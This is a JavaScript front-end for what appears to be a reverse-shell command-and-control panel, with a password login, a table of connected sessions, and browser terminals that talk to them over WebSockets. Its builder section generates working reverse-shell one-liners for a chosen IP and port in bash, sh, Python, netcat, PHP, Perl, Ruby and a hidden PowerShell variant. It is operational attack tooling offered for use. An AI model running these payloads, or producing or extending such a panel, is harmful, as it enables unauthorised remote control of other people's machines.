/* ------------------------------
   Login
--------------------------------*/
async function login() {
    const pass = document.getElementById("password").value
    const r = await fetch("/api/login", {
        method: "POST",
        body: JSON.stringify({ password: pass })
    })
    if (r.status == 200) {
        document.getElementById("loginPanel").style.display = "none"
        localStorage.setItem("auth","1")

        loadSessions()
        setInterval(loadSessions,3000)
        setInterval(updateStatus,2000)
    } else alert("Wrong password")
}

/* ------------------------------
   Builder menu
--------------------------------*/
const dialog = document.getElementById("builderDialog");

document.getElementById("builderBtn").onclick = () => {
  dialog.showModal();
};

document.getElementById("closeBuilder").onclick = () => {
  dialog.close();
};

document.getElementById("createShell").onclick = () => {

  const ip = document.getElementById("builderIp").value;
  const port = document.getElementById("builderPort").value;
  const script = document.getElementById("builderScript").value;

  let cmd = "";

  if (script === "bash")
    cmd = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;

  if (script === "sh")
    cmd = `sh -i >& /dev/tcp/${ip}/${port} 0>&1`;

  if (script === "python")
    cmd = `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`;

  if (script === "nc")
    cmd = `nc ${ip} ${port} -e /bin/bash`;

  if (script === "php")
    cmd = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/bash -i <&3 >&3 2>&3");'`;

  if (script === "perl")
    cmd = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`;

  if (script === "ruby")
    cmd = `ruby -rsocket -e 'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'`;

  if (script === "powershell")
    cmd = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`;

  document.getElementById("shellOutput").textContent = cmd;
};

document.getElementById("copyShell").onclick = () => {

  const text = document.getElementById("shellOutput").textContent;

  navigator.clipboard.writeText(text);
};

/* ------------------------------
   Status strip
--------------------------------*/
async function updateStatus(){
    if(localStorage.getItem("auth")!=="1") return
    let r=await fetch("/api/stats")
    let j=await r.json()
    document.getElementById("online").innerText=j.online
}

/* ------------------------------
   Sessions & Terminal
--------------------------------*/
const sessionTable = document.getElementById("sessionTable")
const tabs = document.getElementById("tabs")
const terminalArea = document.getElementById("terminalArea")
const terminals = {}

function addSession(id, ip, type){
    const row = sessionTable.insertRow()
    row.insertCell(0).innerText = id
    row.insertCell(1).innerText = ip
    row.insertCell(2).innerText = type
    row.onclick = ()=>openTerminal(id)
}

function openTerminal(id){
    if(terminals[id]){ activateTab(id); return }

    const tab = document.createElement("div")
    tab.className="tab"
    const label = document.createElement("span")
    label.innerText=id
    const close = document.createElement("span")
    close.innerText="✕"
    close.className="tab-close"
    tab.appendChild(label)
    tab.appendChild(close)
    tabs.appendChild(tab)

    const termDiv = document.createElement("div")
    termDiv.className="terminal"
    termDiv.style.display="none"
    terminalArea.appendChild(termDiv)

    const term = new Terminal({cursorBlink:true})
    const fitAddon = new FitAddon.FitAddon()
    term.loadAddon(fitAddon)
    term.open(termDiv)
    fitAddon.fit()

    const proto = location.protocol === "https:" ? "wss://" : "ws://"
    const ws = new WebSocket(proto + location.host + "/ws/session?id=" + id)

    ws.onopen = ()=>term.focus()
    ws.onmessage = e=>term.write(e.data)
    term.onData(data=>{ if(ws.readyState===1) ws.send(data) })

    window.addEventListener("resize",()=>{ fitAddon.fit() })

    terminals[id]={ tab, term, termDiv, ws, fit: fitAddon }

    tab.onclick=()=>activateTab(id)
    close.onclick=(e)=>{ e.stopPropagation(); closeTab(id) }

    activateTab(id)
}

function activateTab(id){
    for(let k in terminals){
        const t=terminals[k]
        t.tab.classList.remove("active")
        t.termDiv.style.display="none"
    }
    const t=terminals[id]
    if(!t) return
    t.tab.classList.add("active")
    t.termDiv.style.display="block"
    t.fit.fit()
}

function closeTab(id){
    const t=terminals[id]
    if(!t) return
    t.ws.close()
    t.tab.remove()
    t.termDiv.remove()
    delete terminals[id]
}

/* ------------------------------
   Load sessions
--------------------------------*/
function loadSessions(){
    if(localStorage.getItem("auth")!=="1") return
    fetch("/api/sessions")
    .then(r=>r.json())
    .then(list=>{
        sessionTable.innerHTML = `
        <tr><th>ID</th><th>IP</th><th>Type</th></tr>`
        list.forEach(s=>addSession(s.id,s.ip,s.type))
    })
}

/* ------------------------------
   Splitter support
--------------------------------*/
const splitter=document.getElementById("splitter")
const sessions=document.getElementById("sessions")
const container=document.getElementById("container")
let dragging=false
splitter.addEventListener("mousedown",()=>{ dragging=true })
document.addEventListener("mouseup",()=>{ dragging=false })
document.addEventListener("mousemove",e=>{
    if(!dragging) return
    let y=e.clientY-container.getBoundingClientRect().top
    if(y<80) y=80
    if(y>container.clientHeight-120) y=container.clientHeight-120
    sessions.style.height=y+"px"
})

loadSessions()
setInterval(() => {
    loadSessions();
}, 3000);